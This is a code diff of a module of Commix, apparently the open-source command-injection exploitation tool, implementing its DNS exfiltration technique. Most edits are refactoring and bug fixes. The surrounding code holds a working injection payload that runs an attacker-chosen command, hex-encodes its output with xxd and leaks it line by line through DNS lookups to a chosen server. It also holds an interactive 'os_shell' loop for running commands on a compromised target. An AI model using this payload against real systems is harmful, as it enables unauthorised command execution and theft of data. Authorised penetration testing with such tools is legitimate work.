@@ -3,7 +3,7 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2020 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -37,30 +37,6 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 from scapy.all import *
 
-readline_error = False
-if settings.IS_WINDOWS:
-  try:
-    import readline
-  except ImportError:
-    try:
-      import pyreadline as readline
-    except ImportError:
-      readline_error = True
-else:
-  try:
-    import readline
-    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
-      import gnureadline as readline
-  except ImportError:
-    try:
-      import gnureadline as readline
-    except ImportError:
-      readline_error = True
-pass
-
-
-
-
 """
 The DNS exfiltration technique: 
 exfiltrate data using a user-defined DNS server [1].
@@ -88,16 +64,16 @@ def cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter):
   payload = ("; " + cmd + " | xxd -p -c 16 | while read line; do host $line.xxx " + dns_server + "; done")
   
   # Check if defined "--verbose" option.
-  if settings.VERBOSITY_LEVEL >= 1:
+  if settings.VERBOSITY_LEVEL != 0:
     sys.stdout.write("\n" + settings.print_payload(payload))
 
-  if http_request_method == "GET":
+  if not menu.options.data:
     url = url.replace(settings.INJECT_TAG, "")
     data = payload.replace(" ", "%20")
     request = url + data
   else:
     values =  {vuln_parameter:payload}
-    data = _urllib.parse.urlencode(values)
+    data = _urllib.parse.urlencode(values).encode(settings.UNICODE_ENCODING)
     request = _urllib.request.Request(url=url, data=data)
     
   sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
@@ -136,24 +112,17 @@ def input_cmd(dns_server, http_request_method, url, vuln_parameter, technique):
        gotshell= "Y"
     if gotshell in settings.CHOICE_YES:
       print("\nPseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
-      if readline_error:
+      if settings.READLINE_ERROR:
         checks.no_readline_module()
       while True:
         try:
-          # Tab compliter
-          if not readline_error:
-            readline.set_completer(menu.tab_completer)
-            # MacOSX tab compliter
-            if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
-              readline.parse_and_bind("bind ^I rl_complete")
-            # Unix tab compliter
-            else:
-              readline.parse_and_bind("tab: complete")
+          if not settings.READLINE_ERROR:
+            checks.tab_autocompleter()
           cmd = _input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
           cmd = checks.escaped_cmd(cmd)
           if cmd.lower() in settings.SHELL_OPTIONS:
             if cmd.lower() == "quit" or cmd.lower() == "back":       
-              print("")             
+              print(settings.SINGLE_WHITESPACE)             
               os._exit(0)
             elif cmd.lower() == "?": 
               menu.os_shell_options()
@@ -168,19 +137,19 @@ def input_cmd(dns_server, http_request_method, url, vuln_parameter, technique):
             cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter)
 
         except KeyboardInterrupt:
-          print("")
+          print(settings.SINGLE_WHITESPACE)
           os._exit(0)
           
         except:
-          print("")
+          print(settings.SINGLE_WHITESPACE)
           os._exit(0)
 
     elif gotshell in settings.CHOICE_NO:
-      print("")
+      print(settings.SINGLE_WHITESPACE)
       os._exit(0)
 
     elif gotshell in settings.CHOICE_QUIT:
-      print("")
+      print(settings.SINGLE_WHITESPACE)
       os._exit(0)
 
     else:
@@ -199,7 +168,7 @@ def exploitation(dns_server, url, http_request_method, vuln_parameter, technique
   if menu.options.os_cmd:
     cmd = menu.options.os_cmd
     cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter)
-    print("")
+    print(settings.SINGLE_WHITESPACE)
     os._exit(0)
   else:
     input_cmd(dns_server, http_request_method, url, vuln_parameter, technique)
@@ -215,8 +184,8 @@ def dns_exfiltration_handler(url, http_request_method):
     print("\n" + settings.print_critical_msg(err_msg))
     os._exit(0)
 
-  if http_request_method == "GET":
-    #url = parameters.do_GET_check(url)
+  if not menu.options.data:
+    #url = parameters.do_GET_check(url, http_request_method)
     vuln_parameter = parameters.vuln_GET_param(url)
     request = _urllib.request.Request(url)
     headers.do_check(request)
@@ -224,7 +193,7 @@ def dns_exfiltration_handler(url, http_request_method):
   else:
     parameter = menu.options.data
     parameter = _urllib.parse.unquote(parameter)
-    parameter = parameters.do_POST_check(parameter)
+    parameter = parameters.do_POST_check(parameter, http_request_method)
     request = _urllib.request.Request(url, parameter)
     headers.do_check(request)
     vuln_parameter = parameters.vuln_POST_param(parameter, url)
@@ -234,11 +203,11 @@ def dns_exfiltration_handler(url, http_request_method):
     try:
       response = proxy.use_proxy(request)
     except _urllib.error.HTTPError as err_msg:
-      if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
+      if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR or str(err_msg.code) == settings.BAD_REQUEST:
         response = False  
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
-        print("\n") + settings.print_critical_msg(err)
+        print("\n" + settings.print_critical_msg(err))
         continue_tests = checks.continue_tests(err_msg)
         if continue_tests == True:
           settings.IGNORE_ERR_MSG = True
@@ -250,11 +219,11 @@ def dns_exfiltration_handler(url, http_request_method):
     try:
       response = tor.use_tor(request)
     except _urllib.error.HTTPError as err_msg:
-      if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
+      if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR or str(err_msg.code) == settings.BAD_REQUEST:
         response = False  
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
-        print("\n") + settings.print_critical_msg(err)
+        print("\n" + settings.print_critical_msg(err))
         continue_tests = checks.continue_tests(err_msg)
         if continue_tests == True:
           settings.IGNORE_ERR_MSG = True
@@ -265,11 +234,11 @@ def dns_exfiltration_handler(url, http_request_method):
     try:
       response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
     except _urllib.error.HTTPError as err_msg:
-      if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
+      if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR or str(err_msg.code) == settings.BAD_REQUEST:
         response = False  
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
-        print("\n") + settings.print_critical_msg(err)
+        print("\n" + settings.print_critical_msg(err))
         continue_tests = checks.continue_tests(err_msg)
         if continue_tests == True:
           settings.IGNORE_ERR_MSG = True
